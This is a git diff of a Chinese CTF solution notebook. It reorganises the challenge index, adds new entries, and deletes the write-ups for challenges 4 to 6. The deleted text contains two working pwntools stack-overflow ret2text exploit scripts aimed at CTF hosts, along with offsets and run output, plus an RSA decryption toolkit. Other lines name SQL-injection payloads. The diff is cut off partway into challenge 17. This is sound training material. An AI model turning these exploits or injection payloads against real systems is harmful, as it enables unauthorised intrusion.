@@ -1,12 +1,12 @@
-﻿---
+---
 AIGC:
   ContentProducer: '001191110102MAD55U9H0F10002'
   ContentPropagator: '001191110102MAD55U9H0F10002'
   Label: '1'
-  ProduceID: '683aafe8-5d0a-4c2c-9556-0b1cd405a69a'
-  PropagateID: '683aafe8-5d0a-4c2c-9556-0b1cd405a69a'
-  ReservedCode1: '16ce3149-e3cf-49c3-87f6-2e995717d00f'
-  ReservedCode2: '16ce3149-e3cf-49c3-87f6-2e995717d00f'
+  ProduceID: '46c44184-6c2f-49ef-97f7-5d44b2fc361d'
+  PropagateID: '46c44184-6c2f-49ef-97f7-5d44b2fc361d'
+  ReservedCode1: 'bce1683e-6054-4162-a79a-101a69c21766'
+  ReservedCode2: 'bce1683e-6054-4162-a79a-101a69c21766'
 ---
 
 # CTF 解题笔记本
@@ -21,50 +21,71 @@ AIGC:
 | 1 | Web | 可变变量 + eval | `flag{03bf91...}` | — |
 | 2 | Web | sha1 数组绕过 | `flag{f2bbcc...}` | — |
 | 3 | Web | Flask 布尔盲注 | `flag{4e8a47...}` | [blind_sqli.py](Web/03-flask-blind-sqli/blind_sqli.py) |
-| 4 | PWN | 栈溢出 + 后门 | `CTF2{fd5d48...}` | [exploit.py](PWN/04-ret2text/exploit.py) |
-| 5 | PWN | 栈溢出 + 浮点绕过 | `CTF2{619d0c...}` | [exploit.py](PWN/05-float-bypass/exploit.py) |
-| 6 | Crypto | RSA 基础解密 | `55774466...` | [rsa_toolkit.py](Crypto/06-rsa-basic/rsa_toolkit.py) |
 | 7 | Web | 正则混淆 + Base64 | payload 已验证 | — |
 | 8 | Web | UNION 回显注入 | `CTF2{4272c3...}` | [union_sqli.py](Web/08-sqli-union/union_sqli.py) |
 | 9 | Web | 逻辑绕过 + Cookie | `CTF2{bb4ae5...}` | — |
+| 17 | Web | 流量分析 SQL盲注还原 | `flag{c84bb04a-...}` | [solve.py](Web/17-traffic-analysis/solve.py) |
+| 20 | Web | 文件上传 任意文件读取 | `CTF2{1cd01c68...}` | [solve.py](Web/20-file-upload-llf/solve.py) |
+| 21 | Web | SSTI 模板注入 Jinja2 config 泄露 | `flag{34c812fc...}` | [solve.py](Web/21-ssti-jinja2/solve.py) |
+| 30 | Web | SSTI Jinja2 严格WAF绕过 POST+字符拼接 | `CTF2{08dea0d4...}` | [solve.py](Web/22-ssti-waf-bypass/solve.py) |
+| 31 | Web | 高明的黑客 PHP代码混淆+动态后门审计 | `CTF2{b774c1e5...}` | [solve.py](Web/31-smart-hacker/solve.py) |
+
+| 4 | PWN | 栈溢出 + 后门 | `CTF2{fd5d48...}` | [exploit.py](PWN/04-ret2text/exploit.py) |
+| 5 | PWN | 栈溢出 + 浮点绕过 | `CTF2{619d0c...}` | [exploit.py](PWN/05-float-bypass/exploit.py) |
+| 21 | PWN | bypwn 栈溢出+shellcode | `CTF2{82c990a5...}` | [exploit.py](PWN/06-bypwn/exploit.py) |
+| 22 | PWN | easyheap 堆溢出+Fastbin Attack | `CTF2{eeeec215...}` | [exploit.py](PWN/07-easyheap/exploit.py) |
+| 28 | PWN | testpwn SSL+ret2text | — | [exploit.py](PWN/08-testpwn/exploit.py) |
+
+| 6 | Crypto | RSA 基础解密 | `55774466...` | [rsa_toolkit.py](Crypto/06-rsa-basic/rsa_toolkit.py) |
+| 14 | Crypto | 燕言燕语 Hex+维吉尼亚 | `bjd{yanzi_jiushige_shabi}` | [solve.py](Crypto/14-bjdctf-yanzi/solve.py) |
+| 15 | Crypto | 老文盲了 生僻字拼音 | `BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}` | [solve.py](Crypto/15-bjdctf-laowenmang/solve.py) |
+| 16 | Crypto | 仿射密码+模逆元 | `flag{c29yY2VyeQ==}` | [solve.py](Crypto/16-affine-cipher/solve.py) |
+| 19 | Crypto | easyencode 多层编码 | `Dest0g3{Deoding_...}` | [solve.py](Crypto/19-easyencode/solve.py) |
+
 | 10 | Reverse | Java 字节码逆向 | `This_is_the_flag_!` | — |
 | 11 | Reverse | pyc 反编译 | `GWHT{Just_Re...}` | — |
 | 12 | Reverse | ELF 自修改+AES+MD5 | `flag{924a9a...}` | [solve.py](Reverse/12-elf-aes-md5/solve.py) |
 | 13 | Reverse | PE 四阶段加密链 | `flag{BruteForce...}` | [solve.py](Reverse/13-pe-encryption-chain/solve.py) |
-| 14 | Crypto | 燕言燕语 Hex+维吉尼亚 | `bjd{yanzi_jiushige_shabi}` | [solve.py](Crypto/14-bjdctf-yanzi/solve.py) |
-| 15 | Crypto | 老文盲了 生僻字拼音 | `BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}` | [solve.py](Crypto/15-bjdctf-laowenmang/solve.py) |
-| 16 | Crypto | 仿射密码+模逆元 | `flag{c29yY2VyeQ==}` | [solve.py](Crypto/16-affine-cipher/solve.py) |
-| 17 | Web | 流量分析 SQL盲注还原 | `flag{c84bb04a-...}` | [solve.py](Web/17-traffic-analysis/solve.py) |
+
 | 18 | IR | 蚁剑Webshell流量分析 | `DASCTF{f3f32f43...}` | [solve.py](IR/18-simpleflow-antsword/solve.py) |
-| 19 | Crypto | easyencode 多层编码 | `Dest0g3{Deoding_...}` | [solve.py](Crypto/19-easyencode/solve.py) |
-| 20 | Web | 文件上传 任意文件读取 | `CTF2{1cd01c68...}` | [solve.py](Web/20-file-upload-llf/solve.py) |
-| 21 | PWN | bypwn 栈溢出+shellcode | `CTF2{82c990a5...}` | [exploit.py](PWN/06-bypwn/exploit.py) |
-| 22 | PWN | easyheap 堆溢出+Fastbin Attack | `CTF2{eeeec215...}` | [exploit.py](PWN/07-easyheap/exploit.py) |
 | 23 | IR | PCAP Arcanum 流量取证工具 | `DASCTF{f3f32f43...}` | [pcap_arcanum.py](IR/19-pcap-arcanum/pcap_arcanum.py) |
 | 24 | IR | Redis未授权访问应急响应 | `flag{thisismybaby}` `flag{kfcvme50}` `flag{P@ssW0rd_redis}` | [ir_scan.py](IR/20-redis-incident/ir_scan.py) |
 | 25 | IR | Windows Web应急响应 | IP:`192.168.126.1` 账户:`hack168$` 密码:`rebeyond` 矿池:`wakuang.zhigongshanfang.top` | [win_web_ir.py](IR/21-win-web-ir/win_web_ir.py) |
 | 26 | IR | Linux Web应急响应 (PHPEMS考试系统) | IP:`192.168.20.131` 密码:`Network@2020` flag1:`flag1{Network@_2020_Hack}` flag2:`flag{bL5Frin6...}` flag3:`flag{5LourqoF...}` | [linux_web_ir2.py](IR/22-linux-web-ir2/linux_web_ir2.py) |
 | 27 | IR | Windows挖矿应急响应 (c3pool) | IP:`192.168.115.131` 时间:`2024-05-21 20:25:22` 端口:`3389` 矿池:`auto.c3pool.org` 钱包:`4APXVhuk...` | — |
-| 28 | PWN | testpwn (Warm Up) SSL+ret2text | `CTF2{a4ff3bcb...}` | [pwn_arcanum.py](PWN/pwn-arcanum/pwn_arcanum.py) |
-| 29 | IR | 帕鲁杯应急响应挑战赛 (52子题) | 5个FLAG已验证 | — |
 
 ## 统计
 
-- **总题数**：29（含1道综合IR实战赛题，内含52道子题）
-- **Web**：8 题（PHP 5 + Flask 1 + SQL 1 + 流量分析 1）
-- **PWN**：5 题（栈溢出 Ret2Text 系列 + Ret2Shellcode + 堆溢出 Fastbin + SSL远程利用）
+- **总题数**：31
+- **Web**：11 题（PHP 5 + Flask 1 + SQL 1 + 流量分析 1 + SSTI 2 + 代码混淆动态审计 1）
+- **PWN**：5 题（栈溢出 Ret2Text 系列 + Ret2Shellcode + 堆溢出 Fastbin + SSL ret2text）
 - **Crypto**：5 题（RSA + 维吉尼亚密码 + 生僻字拼音 + 仿射密码 + 多层编码）
 - **Reverse**：4 题（Java / Python / ELF / PE）
-- **IR（应急响应）**：7 题（Webshell 流量分析 + 自动化流量取证工具 + Redis未授权访问 + Windows Web应急响应 + Linux Web应急响应PHPEMS + Windows挖矿c3pool + 帕鲁杯多组件综合IR实战）
-- **IDA Pro 9.3** 用于 PWN 和 Reverse 题目的反编译分析
-- **capstone** 用于 stripped ELF 的线性反汇编（PWN 第22题）
-- **scapy + pycryptodome** 用于 IR 流量分析和加密通信解码
-- **paramiko** 用于 IR 远程SSH连接靶机排查（第24题起）
-- **pyinstxtractor + uncompyle6** 用于 PyInstaller 打包的 Python exe 逆向（第25题）
-- **MD5 + pcap strings** 用于 Linux Web IR 取证（第26题）
-- **SafeLine WAF API + JumpServer审计 + Zabbix数据库审计** 用于帕鲁杯多组件IR取证（第29题）
+- **IR（应急响应）**：6 题（Webshell 流量分析 + 自动化流量取证工具 + Redis未授权访问 + Windows Web应急响应 + Linux Web应急响应PHPEMS + Windows挖矿应急响应）
+- **知识点补充**：27 个专题
+  - 第一轮 (6): SSTI + 反序列化 + SSRF + 图片隐写 + 压缩包技巧 + 内存取证
+  - 第二轮 (7): XSS + 文件包含 + 命令执行/代码执行 + Ret2Libc + 格式化字符串 + AES/Padding Oracle + 法律法规
+  - 第三轮 (8): RSA全面题型 + 古典密码 + 散列攻击 + DH/离散对数 + ECC + 伪随机数 + 格密码
+  - 第四轮 (7个Web工具): SQLi工具/目录扫描/SSTI工具/LFI工具/RCE bypass/SSRF工具/PHP审计
+  - 第五轮 (8): IoT固件分析 + 文件上传 + 流量分析方法论 + PHP反序列化进阶 + PWN堆利用(fastbin/tcache/UAF) + 逆向加密算法识别 + 车联网安全(CAN/UDS) + QEMU固件模拟
+  - 第六轮 (2): .user.ini/.htaccess 文件解析配置利用 + PHP 伪协议详解
+  - 第七轮 (1): 控制软件配置逆向分析（C2 配置提取与解密，含双层 RC4 实战案例）
+- **专用工具**：
+  - **IDA Pro 9.3** 用于 PWN 和 Reverse 题目的反编译分析
+  - **capstone** 用于 stripped ELF 的线性反汇编（PWN 第22题）
+  - **scapy + pycryptodome** 用于 IR 流量分析和加密通信解码
+  - **paramiko** 用于 IR 远程SSH连接靶机排查（第24题起）
+  - **pyinstxtractor + uncompyle6** 用于 PyInstaller 打包的 Python exe 逆向（第25题）
+  - **config_extractor.py** 用于 C2 样本配置自动提取与解密（Reverse 方向）
+  - **deflower.py** 用于花指令自动清除，11 条规则覆盖 CTF 主流花指令（Reverse 方向）
+  - **MD5 + pcap strings** 用于 Linux Web IR 取证（第26题）
 
 ---
+
+
+---
+
+## Web 方向
 
 ## 第1题：PHP 可变变量 + eval 代码执行
 
@@ -378,505 +399,6 @@ Flag: `flag{4e8a47682414b4fba441d2a4108ba632}`
 - 若过滤了 AND，可用 `&&` 或嵌套条件替代
 - 时间盲注：当页面无布尔差异时，用 `IF(condition, SLEEP(3), 0)` 制造延迟差异
 - 报错注入：用 `extractvalue()`、`updatexml()` 等函数将数据暴露在错误信息中
-
-## 第4题：PWN 栈溢出 + 后门函数（IDA 辅助分析）
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | PWN - 栈溢出（Ret2Text） |
-| 难度 | 入门 |
-| 日期 | 2026-07-30 |
-| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |
-
-### 题目描述
-
-ELF 64位可执行文件，通过 `ncat --ssl <host> 9999` 远程连接。程序输出一段欢迎信息和一个地址泄露，然后等待用户输入。
-
-### IDA 反编译结果
-
-**main 函数 (0x40061D)**
-```c
-__int64 main() {
-    char s[64];                              // [rbp-80h] 缓冲区
-    write(1, "-Warm Up-\n", 10);
-    write(1, "WOW:", 4);
-    sprintf(s, "%p\n", sub_40060D);          // 泄露后门函数地址
-    write(1, s, 9);
-    write(1, ">", 1);
-    return gets();                           // gets() 无长度限制 → 栈溢出!
-}
-```
-
-**后门函数 sub_40060D (0x40060D)**
-```c
-int sub_40060D() {
-    return system("cat flag.txt");           // 直接读取 flag!
-}
-```
-
-### 解题思路
-
-**1. 漏洞分析**
-
-- `gets()` 读取输入到 `[rbp-0x40]`，无长度限制，导致栈溢出
-- 程序内置后门函数 `sub_40060D`，直接调用 `system("cat flag.txt")`
-- 程序通过 `sprintf(s, "%p", sub_40060D)` 主动泄露后门地址
-- ELF 无 PIE（固定基址 0x400000），后门地址恒为 0x40060D
-
-**2. 偏移量计算**
-
-从 IDA 汇编分析：
-```
-0x400692: lea rax, [rbp+var_40]    ; gets 输入缓冲区在 rbp-0x40
-0x400696: mov rdi, rax
-0x400699: call _gets
-```
-
-- gets 缓冲区起始：`rbp - 0x40`
-- 到 saved rbp 的距离：0x40 = 64 字节
-- 到返回地址的距离：0x40 + 8 = 72 字节（0x48）
-
-**3. 栈对齐处理**
-
-x86-64 的 `system()` 在某些 libc 版本中要求 16 字节栈对齐。直接跳转到后门函数入口可能导致 `movaps` 指令崩溃。解决方案：在 payload 中添加一个 `ret` gadget 进行栈对齐。
-
-```
-ret gadget 地址：0x4006A4（main 函数末尾的 retn 指令）
-```
-
-**4. Payload 结构**
-
-```
-[填充 72 字节 'A'] + [ret gadget 0x4006A4] + [后门地址 0x40060D]
-     64字节缓冲区+8字节rbp        8字节栈对齐         8字节返回地址
-```
-
-### 解题脚本
-
-```python
-from pwn import *
-import ssl, socket
-
-HOST = '39f71dab837b6029aa64ce18.tcp-ctf2.dasctf.com'
-PORT = 9999
-
-BACKDOOR_ADDR = 0x40060D      # sub_40060D: system("cat flag.txt")
-RET_GADGET = 0x4006A4         # ret 指令（栈对齐）
-OFFSET = 0x40 + 8             # 72 字节：64 填充 + 8 saved rbp
-
-# SSL 连接
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
-ssl_sock.connect((HOST, PORT))
-
-# 接收泄露
-data = ssl_sock.recv(4096)
-print(f"Received: {data}")
-
-# 构造 payload
-payload = b'A' * OFFSET + p64(RET_GADGET) + p64(BACKDOOR_ADDR)
-ssl_sock.send(payload + b'\n')
-
-# 接收 flag
-import time; time.sleep(2)
-print(ssl_sock.recv(4096).decode())
-```
-
-### 运行结果
-
-```
-[*] Received: b'-Warm Up-\nWOW:0x40060d\n>'
-[*] Leaked backdoor address: 0x40060d
-[*] Payload length: 88
-[*] Response: CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}
-```
-
-Flag: `CTF2{fd5d48ff-5eb9-4ed2-b9d6-3aca695e0a88}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| 栈溢出（Stack Overflow） | gets() 无长度限制，可覆盖返回地址 |
-| Ret2Text | 跳转到程序内置的代码段（后门函数）执行 |
-| IDA Pro 反编译 | 使用 idat 批处理模式自动反编译，提取伪代码和汇编 |
-| 栈对齐（Stack Alignment） | x86-64 下 system() 要求 16 字节对齐，需 ret gadget 修正 |
-| 地址泄露 | 程序通过 %p 格式化输出后门函数地址 |
-| ELF 无 PIE | 固定基址 0x400000，函数地址不变，无需信息泄露 |
-| pwntools | p64() 打包地址，构造二进制 payload |
-
-### 同类变体与扩展
-
-- 若无后门函数，需 Ret2libc：泄露 libc 基址 → 计算 system() 和 /bin/sh 地址 → 构造 ROP 链
-- 若有 Canary 保护，需先泄露 canary 值再溢出
-- 若有 PIE，需先泄露代码段基址
-- 若使用 `one_gadget`，可直接跳转到 libc 中 execve("/bin/sh") 的 one-gadget RCE 地址
-- IDA 批处理脚本可进一步扩展：自动识别危险函数（gets/strcpy/sprintf）、自动计算偏移量
-
-## 第5题：PWN 栈溢出 + 浮点数条件绕过（IDA 辅助分析）
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | PWN - 栈溢出（Ret2Text 变体） |
-| 难度 | 入门 |
-| 日期 | 2026-07-31 |
-| 工具 | IDA Pro 9.3（反编译）、pwntools（exploit） |
-
-### 题目描述
-
-ELF 64位可执行文件，远程连接后提示 "Let's guess the number."，要求猜一个数字。程序内含 `system("cat /flag")` 调用，但浮点数条件判断使正常流程无法到达。
-
-### IDA 反编译结果
-
-**func 函数 (0x400676)**
-```c
-int func() {
-    puts("Let's guess the number.");
-    gets();                                    // gets() 栈溢出！缓冲区在 rbp-0x30
-    if (11.28125 == 0.0)                       // 浮点数比较，永远为 FALSE
-        return system("cat /flag");            // 死代码，正常走不到
-    else
-        return puts("Its value should be 11.28125");
-}
-```
-
-**关键汇编**
-```asm
-0x400691: lea rax, [rbp+var_30]        ; gets 输入缓冲区 rbp-0x30
-0x40069D: call _gets                   ; 栈溢出点
-0x4006A7: ucomiss xmm0, cs:dword_4007F4  ; 11.28125 vs 0.0
-0x4006BC: jnz  short loc_4006CF        ; 跳转到 else 分支
-0x4006BE: mov edi, offset command       ; "cat /flag" ← 目标地址!
-0x4006C3: mov eax, 0
-0x4006C8: call _system
-```
-
-### 解题思路
-
-**1. 漏洞分析**
-
-- `gets()` 读取到 `[rbp-0x30]`，无长度限制 → 栈溢出
-- 浮点数比较 `11.28125 == 0.0` 永远为 FALSE → 正常流程走不到 `system("cat /flag")`
-- 无论输入什么数字，都会输出 "Its value should be 11.28125"
-
-**2. 绕过方式**
-
-不需要满足浮点数条件！直接通过栈溢出覆盖返回地址，跳转到 `system("cat /flag")` 的调用点 `0x4006BE`。
-
-**3. 偏移量计算**
-
-从 IDA 汇编：
-- gets 缓冲区起始：`rbp - 0x30`
-- 到 saved rbp：0x30 = 48 字节
-- 到返回地址：0x30 + 8 = 56 字节
-
-**4. Payload 结构**
-
-```
-[填充 56 字节 'A'] + [0x4006BE]
-     48字节缓冲区+8字节rbp    system("cat /flag") 调用点
-```
-
-注意：跳转目标是 `0x4006BE`（`mov edi, "cat /flag"` 指令），而非函数开头 `0x400676`。这样直接进入 system 调用，无需满足任何条件。
-
-### 解题脚本
-
-```python
-from pwn import *
-import ssl, socket
-
-HOST = 'f50ba9f58e7c20a5aa07c700.tcp-ctf2.dasctf.com'
-PORT = 9999
-
-SYSTEM_CALL = 0x4006BE       # mov edi, "cat /flag"; call system
-OFFSET = 0x30 + 8            # 56 字节
-
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ssl_sock = ctx.wrap_socket(sock, server_hostname=HOST)
-ssl_sock.connect((HOST, PORT))
-
-# Receive prompt
-data = ssl_sock.recv(4096)
-print(data.decode())
-
-# Send payload
-payload = b'A' * OFFSET + p64(SYSTEM_CALL)
-ssl_sock.send(payload + b'\n')
-
-# Get flag
-import time; time.sleep(2)
-print(ssl_sock.recv(4096).decode())
-```
-
-### 运行结果
-
-```
-[*] Received: b"Let's guess the number.\n"
-[*] Result: Its value should be 11.28125
-CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}
-```
-
-Flag: `CTF2{619d0c3f-3afe-4e01-8217-81ccc77243ab}`
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| gets() 栈溢出 | 无长度限制的输入函数，经典溢出源 |
-| 浮点数条件绕过 | 11.28125 == 0.0 永远为 FALSE，正常流程不可达 |
-| Ret2Text（指令片段跳转） | 不跳函数开头，直接跳到 system 调用的 gadget 地址 |
-| IDA 精确定位 gadget | 通过反编译/汇编找到 `mov edi, "cat /flag"` 的精确地址 |
-| ucomiss 指令 | SSE 浮点数比较指令，影响 ZF/PF/CF 标志位 |
-| 无 PIE | 固定地址 0x400000，可直接硬编码跳转地址 |
-
-### 与第4题对比
-
-| 特征 | 第4题 (pwn1) | 第5题 (pwn2) |
-|------|---------------|---------------|
-| 缓冲区位置 | rbp-0x40 | rbp-0x30 |
-| 溢出偏移 | 72 字节 | 56 字节 |
-| 后门函数 | 独立函数 sub_40060D | 死代码片段（条件不可达） |
-| 绕过方式 | 覆盖返回地址跳函数 | 覆盖返回地址跳 gadget |
-| 栈对齐 | 需要 ret gadget | 不需要 |
-| 地址泄露 | 程序主动泄露 | 无泄露（也不需要） |
-
-### 同类变体与扩展
-
-- 若目标需要多个参数，可构造 ROP 链逐个设置 rdi/rsi/rdx
-- 若 `system()` 不可用，可找 `execve()` 的 one-gadget
-- 浮点数条件题型的其他解法：直接覆盖栈上的浮点变量 var_4 为 0.0
-
-## 第6题：RSA 基础解密
-
-### 题目信息
-
-| 项目 | 内容 |
-|------|------|
-| 题目类型 | Crypto - RSA |
-| 难度 | 入门 |
-| 日期 | 2026-07-31 |
-| 工具 | gmpy2（大数加速）、pycryptodome（编码转换） |
-
-### 题目描述
-
-"Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm."
-
-直接给出 RSA 的全部参数：p、q、e、c，要求解密还原明文。
-
-### 题目参数
-
-```
-p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
-q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
-e = 65537
-c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
-```
-
-### 解题思路
-
-**1. RSA 算法回顾**
-
-RSA 加解密流程：
-- 公钥：`(n, e)`，其中 `n = p × q`
-- 加密：`c = m^e mod n`
-- 私钥：`d = e⁻¹ mod φ(n)`，其中 `φ(n) = (p-1)(q-1)`
-- 解密：`m = c^d mod n`
-
-**2. 本题特点**
-
-题目直接给出了 p 和 q（无需因式分解 n），因此可以直接计算 φ(n)，再求私钥 d，最后解密。
-
-**3. 库选择与性能对比**
-
-本题使用三个核心库替代纯 Python 内置函数：
-
-| 库 | 用途 | 对比 Python 内置 |
-|----|------|-----------------|
-| `gmpy2` | 模逆元 `invert()`、模幂 `powmod()`、开方 `iroot()`、素性检测 | 快 **6.2x**（500次RSA运算: 0.35s vs 2.18s） |
-| `pycryptodome` | `long_to_bytes()` / `bytes_to_long()` 编码转换 | 比手写 `int.to_bytes()` 更方便，自动处理长度 |
-| `sympy` | `factorint()` 因式分解（Pollard rho + ECM） | 离线可用，适合中小规模 n |
-
-gmpy2 底层是 GMP (GNU Multiple Precision) C 库，大数运算远快于 Python 的纯整数实现。
-
-**4. 解题步骤**
-
-```
-Step 1: n = p × q
-Step 2: φ(n) = (p-1) × (q-1)
-Step 3: d = e⁻¹ mod φ(n)        ← gmpy2.invert(e, phi)
-Step 4: m = c^d mod n            ← gmpy2.powmod(c, d, n)
-Step 5: 验证 m^e mod n == c      ← 确认解密正确
-```
-
-### 解题脚本
-
-> 完整脚本保存为 `rsa_toolkit.py`，封装了 RSA 解密 + 常见攻击模块，可复用。
-
-```python
-#!/usr/bin/env python3
-"""
-CTF RSA 解题通用脚本库 (rsa_toolkit.py)
-封装 RSA 常用操作，优先使用 gmpy2 加速大数运算，
-无 gmpy2 时自动回退到 Python 内置函数。
-
-核心依赖: gmpy2, pycryptodome
-可选依赖: sympy (因式分解)
-安装: pip install gmpy2 pycryptodome sympy
-"""
-
-# ---- 依赖加载（优先 gmpy2，回退内置）----
-try:
-    import gmpy2
-    _HAS_GMPY2 = True
-except ImportError:
-    _HAS_GMPY2 = False
-
-from Crypto.Util.number import long_to_bytes, bytes_to_long
-
-# ---- 基础运算 ----
-
-def modinv(a, m):
-    """模逆元 a^{-1} mod m"""
-    if _HAS_GMPY2:
-        return int(gmpy2.invert(a, m))
-    return pow(a, -1, m)
-
-def powmod(base, exp, mod):
-    """模幂 base^exp mod mod"""
-    if _HAS_GMPY2:
-        return int(gmpy2.powmod(base, exp, mod))
-    return pow(base, exp, mod)
-
-def iroot(n, k):
-    """整数 k 次方根，返回 (root, is_exact)"""
-    if _HAS_GMPY2:
-        r, exact = gmpy2.iroot(n, k)
-        return int(r), bool(exact)
-    # 回退：二分搜索
-    lo, hi = 0, 1 << ((n.bit_length() + k - 1) // k + 1)
-    while lo < hi:
-        mid = (lo + hi) // 2
-        if mid ** k < n:
-            lo = mid + 1
-        else:
-            hi = mid
-    return lo, (lo ** k == n)
-
-# ---- RSA 核心 ----
-
-def rsa_compute_d(p, q, e):
-    """已知 p, q, e 计算私钥 d"""
-    phi = (p - 1) * (q - 1)
-    return modinv(e, phi)
-
-def rsa_decrypt(c, d, n):
-    """RSA 解密: m = c^d mod n"""
-    return powmod(c, d, n)
-
-# ---- 第6题: RSA 基础解密 ----
-
-if __name__ == '__main__':
-    p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
-    q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
-    e = 65537
-    c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
-
-    print(f"gmpy2 加速: {'已启用' if _HAS_GMPY2 else '未安装(回退内置)'}")
-
-    n = p * q
-    d = rsa_compute_d(p, q, e)
-    m = rsa_decrypt(c, d, n)
-
-    # 验证
-    assert powmod(m, e, n) == c, "验证失败!"
-
-    print(f"n   = {n}")
-    print(f"d   = {d}")
-    print(f"m   = {m}")
-    print(f"hex = {hex(m)}")
-    print(f"bytes = {long_to_bytes(m)}")
-    print(f"验证: m^e mod n == c  ✓")
-    print(f"\nSecret message: {m}")
-```
-
-> 此外 `rsa_toolkit.py` 还封装了以下攻击模块，供后续 RSA 变体题复用：
-> - `factorize_n(n)` — 因式分解（sympy 本地 + factordb 在线）
-> - `attack_small_e(c, e, n)` — 小加密指数攻击（直接开方）
-> - `attack_common_modulus(n, e1, c1, e2, c2)` — 共模攻击
-> - `attack_wiener(e, n)` — Wiener 攻击（连分数展开恢复 d）
-
-### 运行结果
-
-```
-gmpy2 加速: 已启用
-n   = 114573516752272714750064227635008832737477859608443481000717283425702025029279291376859256856603741797722497252841363753834114679306784379319341824813349417007577541466886971550474580368413974382926969910999462429631003527365143148445405716553105750338796691010126879918594076915709977585368841428779903869581
-d   = 56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977
-m   = 5577446633554466577768879988
-hex = 0x12058e43d9e0c22559c19774
-bytes = b'\x12\x05\x8eC\xd9\xe0\xc2%Y\xc1\x97t'
-验证: m^e mod n == c  ✓
-
-Secret message: 5577446633554466577768879988
-```
-
-明文转为 bytes 后不构成可读 ASCII 文本，说明本题的 secret message 就是这个整数本身。
-
-Flag: `5577446633554466577768879988`
-
-### 环境依赖
-
-```
-# requirements.txt
-gmpy2>=2.1            # GMP 大数运算加速，比Python内置快6x+
-pycryptodome>=3.20    # long_to_bytes/bytes_to_long, RSA/AES等
-sympy>=1.12           # factorint() 因式分解, isprime() 素性检测
-pwntools>=4.12        # PWN题远程连接
-```
-
-安装方式：
-```bash
-# 在线安装
-pip install -r requirements.txt
-
-# 离线迁移（比赛断网环境）
-# 1. 有网环境下载
-pip download -r requirements.txt -d ./packages
-# 2. 拷贝 packages 目录到离线环境
-pip install --no-index --find-links=./packages -r requirements.txt
-```
-
-### 涉及知识点
-
-| 知识点 | 说明 |
-|--------|------|
-| RSA 加解密原理 | 公钥加密 `c=m^e mod n`，私钥解密 `m=c^d mod n` |
-| 欧拉函数 φ(n) | `φ(n) = (p-1)(q-1)`，用于计算私钥 |
-| 模逆元 | `d = e⁻¹ mod φ(n)`，gmpy2 用 `gmpy2.invert(e, phi)` |
-| 模幂运算 | gmpy2.powmod 比内置 pow 快 6x+ |
-| gmpy2 vs 内置 | gmpy2 底层 GMP C 库，大数运算远快于 Python 纯整数实现 |
-| long_to_bytes | pycryptodome 提供，比手写 `int.to_bytes()` 更方便 |
-| 明文编码 | RSA 明文可为整数，不一定能转为可读 bytes |
-| e=65537 | RSA 最常用的公钥指数，费马数 F4 |
-
-### 同类变体与扩展
-
-- 若只给 n 和 e（不给 p、q），需先因式分解 n：小 n 用 sympy `factorint()` 或 `factordb.com`，大 n 用 yafu/msieve/GNFS
-- 若 e=1，则 c=m，直接提交 c 即可
-- 若 e 极小（如 e=3）且 m^3 < n，可直接对 c 开三次方：`gmpy2.iroot(c, 3)`
-- 若多组相同 n 不同 e（共模攻击），用扩展欧几里得算法求 `s1*e1 + s2*e2 = 1`，再 `m = c1^s1 * c2^s2 mod n`
-- Wiener 攻击：当 d 很小时（d < n^0.25），可用连分数展开 e/n 恢复 d
-- 低加密指数广播攻击：同一明文用多个不同 n 加密且 e 相同，用中国剩余定理（CRT）合并后开 e 次方
-- 离线迁移：`pip download -r requirements.txt -d ./packages` 提前下载，断网环境用 `--find-links` 安装
 
 ## 第7题：PHP 正则混淆 + Base64 构造文件读取
 
@@ -1343,6 +865,2600 @@ Flag: `CTF2{bb4ae566-9ae0-4e0a-b9d6-9d3bd18b1b2f}`
 - 若 money 比较用 `intval()`，可利用 `intval('1e9')` = 1 的特性（科学计数法被截断）
 - 信息泄露的其他常见位置：`.git/`、`.svn/`、`backup.sql`、`robots.txt`、`phpinfo()`
 - 常见 PHP 弱比较绕过：`0 == 'abc'` (TRUE)、`'1' == '01'` (TRUE)、`'10' == '1e1'` (TRUE)
+
+## 第17题：流量分析 — SQL 盲注流量还原
+
+### 题目信息
+
+| 项目 | 内容 |
+|------|------|
+| 题目类型 | Web - 流量分析 / Forensics |
+| 难度 | 中等 |
+| 日期 | 2026-08-01 |
+| 附件 | 流量分析.pcap（2.5MB，16836 个包） |
+
+### 题目内容
+
+提供一个 `.pcap` 网络流量抓包文件，要求从中还原出攻击者提取的数据（flag）。
+
+### 解题思路
+
+**1. 流量概览**
+
+```
+总包数: 16836
+协议: 全部 TCP
+通信: 127.0.0.1 → 127.0.0.1 (本地环回)
